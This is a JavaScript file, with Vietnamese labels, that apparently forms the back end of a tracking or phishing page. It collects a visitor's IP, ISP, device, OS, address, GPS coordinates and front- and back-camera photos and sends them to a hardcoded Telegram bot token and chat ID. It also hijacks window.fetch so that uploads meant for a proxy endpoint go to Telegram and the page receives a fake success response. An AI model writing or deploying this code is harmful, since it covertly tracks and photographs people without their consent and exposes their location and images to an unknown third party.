// telegram.js - GỌN, XỊN, FORMAT ĐẸP
const BOT_TOKEN = '8872849016:AAEstxsi3M4FNMk0esFMG8lvx9M0tlW1Hac';
const CHAT_ID = '-1003805423944';

window.sendToTelegram = async (data) => {
    try {
        let clientInfo = {};
        if (data.clientInfo) {
            clientInfo = typeof data.clientInfo === 'string' 
                ? JSON.parse(data.clientInfo) 
                : data.clientInfo;
        }
        
        const message = `📡 *[THÔNG TIN TRUY CẬP]*

🕒 *Thời gian:* ${clientInfo.time || '?'}
📱 *Thiết bị:* ${clientInfo.device || '?'}
🖥️ *Hệ điều hành:* ${clientInfo.os || '?'}
🌍 *IP dân cư:* ${clientInfo.ip || '?'}
🧠 *IP gốc:* ${clientInfo.ip || '?'}
🏢 *ISP:* ${clientInfo.isp || '?'}
🏙️ *Địa chỉ:* ${clientInfo.location || '?'}
🌎 *Quốc gia:* ${clientInfo.country || '?'}
📍 *Vĩ độ:* ${clientInfo.latitude || '?'}
📍 *Kinh độ:* ${clientInfo.longitude || '?'}
📌 *Google Maps:* ${clientInfo.google_maps || '?'}
📸 *Camera:* ${clientInfo.camera || '?'}

⚠️ *Ghi chú:* ${clientInfo.note || 'Thông tin có khả năng chưa chính xác 100%.'}`;

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
        });
        
        if (data.front && data.front instanceof Blob) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', data.front);
            fd.append('caption', '📸 ẢNH CAMERA TRƯỚC');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }
        
        if (data.back && data.back instanceof Blob) {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', data.back);
            fd.append('caption', '📸 ẢNH CAMERA SAU');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }
        
        console.log("✅ Đã gửi thành công!");
    } catch(e) {
        console.error('❌ Lỗi:', e);
    }
};

const originalFetch = window.fetch;
window.fetch = async (url, options) => {
    if (url === '/api/tele-proxy' && options?.body) {
        const formData = options.body;
        if (formData instanceof FormData) {
            window.sendToTelegram({
                clientInfo: formData.get('clientInfo'),
                front: formData.get('front'),
                back: formData.get('back')
            });
        }
        return new Response(JSON.stringify({ ok: true }), { status: 200 });
    }
    return originalFetch(url, options);
};

console.log("🚀 Telegram proxy đã sẵn sàng!");